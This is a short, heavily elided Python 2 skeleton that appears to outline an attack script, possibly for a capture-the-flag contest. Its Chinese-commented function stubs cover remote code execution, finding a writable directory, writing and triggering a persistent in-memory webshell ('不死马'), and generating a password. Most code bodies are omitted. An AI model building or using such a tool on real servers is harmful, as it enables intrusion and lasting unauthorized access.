...
def code_exec(url, code):# 攻击细节 具体修改 代码执行
...
def get_writable_dir(url, root): # 得到可写的目录
...
def write_memery_webshell(url, directory, password): # 写一个不死马 一直写
    sleep_time = 500 # micro second 微妙
...
def active_memery_webshell(url): # 激活不死马
    try:
        requests.get(url, timeout=0.5)
    except:
        print "[+] OK!"

def get_password(host, port): # 生成一个md5密码
